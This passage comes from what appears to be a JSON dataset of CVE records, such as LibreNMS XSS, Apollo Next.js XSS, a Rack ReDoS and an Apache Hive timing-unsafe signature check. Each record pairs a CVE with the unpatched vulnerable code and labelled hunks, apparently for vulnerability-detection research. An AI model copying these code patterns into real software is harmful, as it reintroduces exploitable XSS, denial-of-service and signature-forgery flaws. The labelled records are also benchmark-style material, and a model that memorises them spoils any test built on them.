          "content": "            echo(\"Erro ao adicionar escala '$escala' ao banco de dados: \" . $e->getMessage());"
        },
        {
          "line_no": 66,
          "content": "        if($nextPage){"
        },
        {
          "line_no": 71,
          "content": "    public function removerEscala(){"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.4,
    "cvss_version": 4.0
  },
  {
    "id": 1211,
    "cve": "CVE-2024-47523",
    "description": "LibreNMS is an open-source, PHP/MySQL/SNMP-based network monitoring system. A Stored Cross-Site Scripting (XSS) vulnerability in the \"Alert Transports\" feature allows authenticated users to inject arbitrary JavaScript through the \"Details\" section (which contains multiple fields depending on which transport is selected at that moment). This vulnerability can lead to the execution of malicious code in the context of other users' sessions, potentially compromising their accounts and allowing unauthorized actions. This vulnerability is fixed in 24.9.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "LibreNMS/Alert/Transport.php",
          "content": "<?php\n\nnamespace LibreNMS\\Alert;\n\nuse App\\Models\\AlertTransport;\nuse App\\View\\SimpleTemplate;\nuse Illuminate\\Support\\Str;\nuse LibreNMS\\Config;\nuse LibreNMS\\Enum\\AlertState;\nuse LibreNMS\\Interfaces\\Alert\\Transport as TransportInterface;\n\nabstract class Transport implements TransportInterface\n{\n    protected ?array $config;\n    protected string $name = '';\n\n    public static function make(string $type): TransportInterface\n    {\n        $class = self::getClass($type);\n\n        return new $class();\n    }\n\n    /**\n     * Returns a list of all available transports\n     *\n     * @return array\n     */\n    public static function list(): array\n    {\n        $list = [];\n        foreach (glob(base_path('LibreNMS/Alert/Transport/*.php')) as $file) {\n            $transport = strtolower(basename($file, '.php'));\n            $class = self::getClass($transport);\n            $instance = new $class;\n            $list[$transport] = $instance->name();\n        }\n\n        return $list;\n    }\n\n    public function __construct(?AlertTransport $transport = null)\n    {\n        $this->config = $transport ? $transport->transport_config : [];\n    }\n\n    /**\n     * @return string The display name of this transport\n     */\n    public function name(): string\n    {\n        if ($this->name !== '') {\n            return $this->name;\n        }\n\n        $path = explode('\\\\', get_called_class());\n\n        return array_pop($path);\n    }\n\n    /**\n     * Helper function to parse free form text box defined in ini style to key value pairs\n     *\n     * @param  string  $input\n     * @param  array  $replacements  for SimpleTemplate if desired\n     * @return array\n     */\n    protected function parseUserOptions(string $input, array $replacements = []): array\n    {\n        $options = [];\n        foreach (preg_split('/\\\\r\\\\n|\\\\r|\\\\n/', $input, -1, PREG_SPLIT_NO_EMPTY) as $option) {\n            if (Str::contains($option, '=')) {\n                [$k, $v] = explode('=', $option, 2);\n                $options[$k] = empty($replacements) ? trim($v) : SimpleTemplate::parse(trim($v), $replacements);\n            }\n        }\n\n        return $options;\n    }\n\n    /**\n     * Get the hex color string for a particular state\n     *\n     * @param  int  $state  State code from alert\n     * @return string Hex color, default to #337AB7 blue if state unrecognised\n     */\n    public static function getColorForState($state)\n    {\n        $colors = [\n            AlertState::CLEAR => Config::get('alert_colour.ok'),\n            AlertState::ACTIVE => Config::get('alert_colour.bad'),\n            AlertState::ACKNOWLEDGED => Config::get('alert_colour.acknowledged'),\n            AlertState::WORSE => Config::get('alert_colour.worse'),\n            AlertState::BETTER => Config::get('alert_colour.better'),\n        ];\n\n        return isset($colors[$state]) ? $colors[$state] : '#337AB7';\n    }\n\n    /**\n     * Display the configuration details of this alert transport\n     *\n     * @return string\n     */\n    public function displayDetails(): string\n    {\n        $output = '';\n\n        // Iterate through transport config template to display config details\n        $config = static::configTemplate();\n        foreach ($config['config'] as $item) {\n            if ($item['type'] == 'oauth') {\n                continue;\n            }\n\n            $val = $this->config[$item['name']];\n            if ($item['type'] == 'password') {\n                $val = '<b>&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;</b>';\n            } elseif ($item['type'] == 'select') {\n                // Match value to key name for select inputs\n                $val = array_search($val, $item['options']);\n            }\n\n            $output .= $item['title'] . ': ' . $val . PHP_EOL;\n        }\n\n        return $output;\n    }\n\n    /**\n     * Get the alert transport class from transport type.\n     *\n     * @param  string  $type\n     * @return string\n     */\n    public static function getClass(string $type): string\n    {\n        return 'LibreNMS\\\\Alert\\\\Transport\\\\' . ucfirst($type);\n    }\n\n    protected function isHtmlContent(string $content): bool\n    {\n        return $content !== strip_tags($content);\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function displayDetails(): string\n    {\n        $output = '';\n\n        // Iterate through transport config template to display config details\n        $config = static::configTemplate();\n        foreach ($config['config'] as $item) {\n            if ($item['type'] == 'oauth') {\n                continue;\n            }\n\n            $val = $this->config[$item['name']];\n            if ($item['type'] == 'password') {\n                $val = '<b>&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;</b>';\n            } elseif ($item['type'] == 'select') {\n                // Match value to key name for select inputs\n                $val = array_search($val, $item['options']);\n            }\n\n            $output .= $item['title'] . ': ' . $val . PHP_EOL;\n        }\n\n        return $output;\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 118,
          "content": "                $val = '<b>&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;</b>';"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_version": 3.1
  },
  {
    "id": 183,
    "cve": "CVE-2024-23841",
    "description": "apollo-client-nextjs is the Apollo Client support for the Next.js App Router. The @apollo/experimental-apollo-client-nextjs NPM package is vulnerable to a cross-site scripting vulnerability. To exploit this vulnerability, an attacker would need to either inject malicious input (e.g. by redirecting a user to a specifically-crafted link) or arrange to have malicious input be returned by a GraphQL server (e.g. by persisting it in a database). To fix this issue, please update to version 0.7.0 or later.",
    "vulnerability": {
      "file_level": [
        {
          "name": "package/src/ssr/dataTransport.ts",
          "content": "import SuperJSON from \"superjson\";\nimport {\n  ApolloSSRDataTransport,\n  ApolloRehydrationCache,\n  ApolloResultCache,\n  ApolloBackgroundQueryTransport,\n} from \"./ApolloRehydrateSymbols\";\nimport type { RehydrationCache } from \"./types\";\nimport { registerLateInitializingQueue } from \"./lateInitializingQueue\";\nimport type { Cache, WatchQueryOptions } from \"@apollo/client\";\nimport invariant from \"ts-invariant\";\n\nexport type DataTransport<T> = Array<T> | { push(...args: T[]): void };\n\ntype DataToTransport = {\n  rehydrate: RehydrationCache;\n  results: Cache.WriteOptions[];\n  backgroundQueries: WatchQueryOptions[];\n};\n\n/**\n * Returns a string of JavaScript that can be used to transport data to the client.\n */\nexport function transportDataToJS(data: DataToTransport) {\n  const key = Symbol.keyFor(ApolloSSRDataTransport);\n  return `(window[Symbol.for(\"${key}\")] ??= []).push(${SuperJSON.stringify(\n    data\n  )})`;\n}\n\n/**\n * Registers a lazy queue that will be filled with data by `transportDataToJS`.\n * All incoming data will be added either to the rehydration cache or the result cache.\n */\nexport function registerDataTransport() {\n  registerLateInitializingQueue(ApolloSSRDataTransport, (data) => {\n    const parsed = SuperJSON.deserialize<DataToTransport>(data);\n    invariant.debug(`received data from the server:`, parsed);\n    Object.assign((window[ApolloRehydrationCache] ??= {}), parsed.rehydrate);\n    (window[ApolloBackgroundQueryTransport] ??= []).push(\n      ...parsed.backgroundQueries\n    );\n    (window[ApolloResultCache] ??= []).push(...parsed.results);\n  });\n}\n"
        }
      ],
      "method_level": [
        "transportDataToJS"
      ],
      "hunk_level": [
        {
          "line_no": 26,
          "content": "  return `(window[Symbol.for(\"${key}\")] ??= []).push(${SuperJSON.stringify("
        },
        {
          "line_no": 27,
          "content": "    data"
        }
      ]
    },
    "cwe": [
      "CWE-80"
    ],
    "severity": "HIGH",
    "cvss_score": 8.2,
    "cvss_version": 3.1
  },
  {
    "id": 388,
    "cve": "CVE-2024-25126",
    "description": "Rack is a modular Ruby web server interface. Carefully crafted content type headers can cause Rack’s media type parser to take much longer than expected, leading to a possible denial of service vulnerability (ReDos 2nd degree polynomial). This vulnerability is patched in 3.0.9.1 and 2.2.8.1.",
    "vulnerability": {
      "file_level": [
        {
          "name": "lib/rack/media_type.rb",
          "content": "# frozen_string_literal: true\n\nmodule Rack\n  # Rack::MediaType parse media type and parameters out of content_type string\n\n  class MediaType\n    SPLIT_PATTERN = %r{\\s*[;,]\\s*}\n\n    class << self\n      # The media type (type/subtype) portion of the CONTENT_TYPE header\n      # without any media type parameters. e.g., when CONTENT_TYPE is\n      # \"text/plain;charset=utf-8\", the media-type is \"text/plain\".\n      #\n      # For more information on the use of media types in HTTP, see:\n      # http://www.w3.org/Protocols/rfc2616/rfc2616-sec3.html#sec3.7\n      def type(content_type)\n        return nil unless content_type\n        content_type.split(SPLIT_PATTERN, 2).first.tap &:downcase!\n      end\n\n      # The media type parameters provided in CONTENT_TYPE as a Hash, or\n      # an empty Hash if no CONTENT_TYPE or media-type parameters were\n      # provided.  e.g., when the CONTENT_TYPE is \"text/plain;charset=utf-8\",\n      # this method responds with the following Hash:\n      #   { 'charset' => 'utf-8' }\n      def params(content_type)\n        return {} if content_type.nil?\n\n        content_type.split(SPLIT_PATTERN)[1..-1].each_with_object({}) do |s, hsh|\n          k, v = s.split('=', 2)\n\n          hsh[k.tap(&:downcase!)] = strip_doublequotes(v)\n        end\n      end\n\n      private\n\n        def strip_doublequotes(str)\n          (str.start_with?('\"') && str.end_with?('\"')) ? str[1..-2] : str\n        end\n    end\n  end\nend\n"
        }
      ],
      "method_level": [
        "def type(content_type)\n        return nil unless content_type\n        content_type.split(SPLIT_PATTERN, 2).first.tap &:downcase!\n      end",
        "def params(content_type)\n        return {} if content_type.nil?\n\n        content_type.split(SPLIT_PATTERN)[1..-1].each_with_object({}) do |s, hsh|\n          k, v = s.split('=', 2)\n\n          hsh[k.tap(&:downcase!)] = strip_doublequotes(v)\n        end\n      end"
      ],
      "hunk_level": [
        {
          "line_no": 18,
          "content": "        content_type.split(SPLIT_PATTERN, 2).first.tap &:downcase!"
        },
        {
          "line_no": 32,
          "content": "          hsh[k.tap(&:downcase!)] = strip_doublequotes(v)"
        }
      ]
    },
    "cwe": [
      "CWE-1333"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 3.1
  },
  {
    "id": 1377,
    "cve": "CVE-2024-23953",
    "description": "Use of Arrays.equals() in LlapSignerImpl in Apache Hive to compare message signatures allows attacker to forge a valid signature for an arbitrary message byte by byte. The attacker should be an authorized user of the product to perform this attack. Users are recommended to upgrade to version 4.0.0, which fixes this issue.\n\nThe problem occurs when an application doesn’t use a constant-time algorithm for validating a signature. The method Arrays.equals() returns false right away when it sees that one of the input’s bytes are different. It means that the comparison time depends on the contents of the arrays. This little thing may allow an attacker to forge a valid signature for an arbitrary message byte by byte. So it might allow malicious users to submit splits/work with selected signatures to LLAP without running as a privileged user, potentially leading to DDoS attack.\n\nMore details in the reference section.",
    "vulnerability": {
      "file_level": [
        {
          "name": "llap-common/src/java/org/apache/hadoop/hive/llap/security/LlapSignerImpl.java",
          "content": "/*\n * Licensed to the Apache Software Foundation (ASF) under one\n * or more contributor license agreements.  See the NOTICE file\n * distributed with this work for additional information\n * regarding copyright ownership.  The ASF licenses this file\n * to you under the Apache License, Version 2.0 (the\n * \"License\"); you may not use this file except in compliance\n * with the License.  You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage org.apache.hadoop.hive.llap.security;\n\nimport java.io.IOException;\nimport java.util.Arrays;\n\nimport org.apache.hadoop.conf.Configuration;\nimport org.apache.hadoop.security.UserGroupInformation;\nimport org.apache.hadoop.security.token.delegation.DelegationKey;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport com.google.common.annotations.VisibleForTesting;\n\npublic class LlapSignerImpl implements LlapSigner {\n  private static final Logger LOG = LoggerFactory.getLogger(LlapSignerImpl.class);\n\n  private final SigningSecretManager secretManager;\n\n  public LlapSignerImpl(Configuration conf, String clusterId) {\n    // TODO: create this centrally in HS2 case\n    assert UserGroupInformation.isSecurityEnabled();\n    secretManager = SecretManager.createSecretManager(conf, clusterId);\n  }\n\n  @VisibleForTesting\n  public LlapSignerImpl(SigningSecretManager sm) {\n    secretManager = sm;\n  }\n\n  @Override\n  public SignedMessage serializeAndSign(Signable message) throws IOException {\n    SignedMessage result = new SignedMessage();\n    DelegationKey key = secretManager.getCurrentKey();\n    message.setSignInfo(key.getKeyId());\n    result.message = message.serialize();\n    result.signature = secretManager.signWithKey(result.message, key);\n    return result;\n  }\n\n  @Override\n  public void checkSignature(byte[] message, byte[] signature, int keyId)\n      throws SecurityException {\n    byte[] expectedSignature = secretManager.signWithKey(message, keyId);\n    if (Arrays.equals(signature, expectedSignature)) return;\n    throw new SecurityException(\"Message signature does not match\");\n  }\n\n  @Override\n  public void close() {\n    try {\n      secretManager.close();\n    } catch (Exception ex) {\n      LOG.error(\"Error closing the signer\", ex);\n    }\n  }\n}\n"
        }
      ],
      "method_level": [
        "@Override\n  public void checkSignature(byte[] message, byte[] signature, int keyId)\n      throws SecurityException {\n    byte[] expectedSignature = secretManager.signWithKey(message, keyId);\n    if (Arrays.equals(signature, expectedSignature)) return;\n    throw new SecurityException(\"Message signature does not match\");\n  }"
      ],
      "hunk_level": [
        {
          "line_no": 61,
          "content": "    if (Arrays.equals(signature, expectedSignature)) return;"
        }
      ]
    },
    "cwe": [
      "CWE-208"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 614,
    "cve": "CVE-2024-31985",
    "description": "XWiki Platform is a generic wiki platform. Starting in version 3.1 and prior to versions 4.10.20, 15.5.4, and 15.10-rc-1, it is possible to schedule/trigger/unschedule existing jobs by having an admin visit the Job Scheduler page through a predictable URL, for example by embedding such an URL in any content as an image. The vulnerability has been fixed in XWiki 14.10.19, 15.5.5, and 15.9. As a workaround, manually apply the patch by modifying the `Scheduler.WebHome` page.",
    "vulnerability": {
      "file_level": [
        {
          "name": "xwiki-platform-core/xwiki-platform-scheduler/xwiki-platform-scheduler-test/xwiki-platform-scheduler-test-docker/src/test/it/org/xwiki/scheduler/test/ui/SchedulerIT.java",
          "content": "/*\n * See the NOTICE file distributed with this work for additional\n * information regarding copyright ownership.\n *\n * This is free software; you can redistribute it and/or modify it\n * under the terms of the GNU Lesser General Public License as\n * published by the Free Software Foundation; either version 2.1 of\n * the License, or (at your option) any later version.\n *\n * This software is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public\n * License along with this software; if not, write to the Free\n * Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n * 02110-1301 USA, or see the FSF site: http://www.fsf.org.\n */\npackage org.xwiki.scheduler.test.ui;\n\nimport org.junit.jupiter.api.Order;\nimport org.junit.jupiter.api.Test;\nimport org.openqa.selenium.By;\nimport org.xwiki.scheduler.test.po.SchedulerHomePage;\nimport org.xwiki.scheduler.test.po.SchedulerPage;\nimport org.xwiki.scheduler.test.po.editor.SchedulerEditPage;\nimport org.xwiki.test.docker.junit5.UITest;\nimport org.xwiki.test.ui.TestUtils;\n\nimport static org.junit.jupiter.api.Assertions.assertEquals;\nimport static org.junit.jupiter.api.Assertions.assertFalse;\nimport static org.junit.jupiter.api.Assertions.fail;\n\n/**\n * Tests Scheduler application features.\n *\n * @version $Id$\n */\n@UITest(\n    properties = {\n        // The scheduler UI need programming right\n        \"xwikiPropertiesAdditionalProperties=test.prchecker.excludePattern=xwiki:Scheduler\\\\.WebHome\",\n\n        // Override in order to add the Scheduler Plugin\n        \"xwikiCfgPlugins=com.xpn.xwiki.plugin.skinx.JsSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.JsSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.LinkExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.scheduler.SchedulerPlugin\"\n    },\n    extraJARs = {\n        // The Scheduler plugin needs to be in WEB-INF/lib since it's defined in xwiki.cfg and plugins are loaded\n        // by XWiki at startup, i.e. before extensions are provisioned for the tests\n        \"org.xwiki.platform:xwiki-platform-scheduler-api\",\n        // Because of https://jira.xwiki.org/browse/XWIKI-17972 we need to install the jython jar manually in\n        // WEB-INF/lib.\n        \"org.python:jython-slim:2.7.3\"\n})\nclass SchedulerIT\n{\n    @Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }\n\n    @Test\n    @Order(2)\n    void verifyEscaping(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        schedulerEdit.setScript(\"{{/code}}\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n\n        assertEquals(\"{{/code}}\", schedulerPage.getScript());\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 73,
          "content": "        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");"
        },
        {
          "line_no": 77,
          "content": "        schedulerHomePage.setJobName(\"SchedulerTestJob\");"
        },
        {
          "line_no": 110,
          "content": "        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");"
        }
      ]
    },
    "cwe": [
      "CWE-352"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.4,
    "cvss_version": 3.1
  },
  {
    "id": 610,
    "cve": "CVE-2024-31985",
    "description": "XWiki Platform is a generic wiki platform. Starting in version 3.1 and prior to versions 4.10.20, 15.5.4, and 15.10-rc-1, it is possible to schedule/trigger/unschedule existing jobs by having an admin visit the Job Scheduler page through a predictable URL, for example by embedding such an URL in any content as an image. The vulnerability has been fixed in XWiki 14.10.19, 15.5.5, and 15.9. As a workaround, manually apply the patch by modifying the `Scheduler.WebHome` page.",
    "vulnerability": {
      "file_level": [
        {
          "name": "xwiki-platform-core/xwiki-platform-scheduler/xwiki-platform-scheduler-test/xwiki-platform-scheduler-test-docker/src/test/it/org/xwiki/scheduler/test/ui/SchedulerIT.java",
          "content": "/*\n * See the NOTICE file distributed with this work for additional\n * information regarding copyright ownership.\n *\n * This is free software; you can redistribute it and/or modify it\n * under the terms of the GNU Lesser General Public License as\n * published by the Free Software Foundation; either version 2.1 of\n * the License, or (at your option) any later version.\n *\n * This software is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public\n * License along with this software; if not, write to the Free\n * Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n * 02110-1301 USA, or see the FSF site: http://www.fsf.org.\n */\npackage org.xwiki.scheduler.test.ui;\n\nimport org.junit.jupiter.api.Order;\nimport org.junit.jupiter.api.Test;\nimport org.openqa.selenium.By;\nimport org.xwiki.scheduler.test.po.SchedulerHomePage;\nimport org.xwiki.scheduler.test.po.SchedulerPage;\nimport org.xwiki.scheduler.test.po.editor.SchedulerEditPage;\nimport org.xwiki.test.docker.junit5.UITest;\nimport org.xwiki.test.ui.TestUtils;\n\nimport static org.junit.jupiter.api.Assertions.assertEquals;\nimport static org.junit.jupiter.api.Assertions.assertFalse;\nimport static org.junit.jupiter.api.Assertions.fail;\n\n/**\n * Tests Scheduler application features.\n *\n * @version $Id$\n */\n@UITest(\n    properties = {\n        // The scheduler UI need programming right\n        \"xwikiPropertiesAdditionalProperties=test.prchecker.excludePattern=xwiki:Scheduler\\\\.WebHome\",\n\n        // Override in order to add the Scheduler Plugin\n        \"xwikiCfgPlugins=com.xpn.xwiki.plugin.skinx.JsSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.JsSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.LinkExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.scheduler.SchedulerPlugin\"\n    },\n    extraJARs = {\n        // The Scheduler plugin needs to be in WEB-INF/lib since it's defined in xwiki.cfg and plugins are loaded\n        // by XWiki at startup, i.e. before extensions are provisioned for the tests\n        \"org.xwiki.platform:xwiki-platform-scheduler-api\",\n        // Because of https://jira.xwiki.org/browse/XWIKI-17972 we need to install the jython jar manually in\n        // WEB-INF/lib.\n        \"org.python:jython-slim:2.7.3\"\n})\nclass SchedulerIT\n{\n    @Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        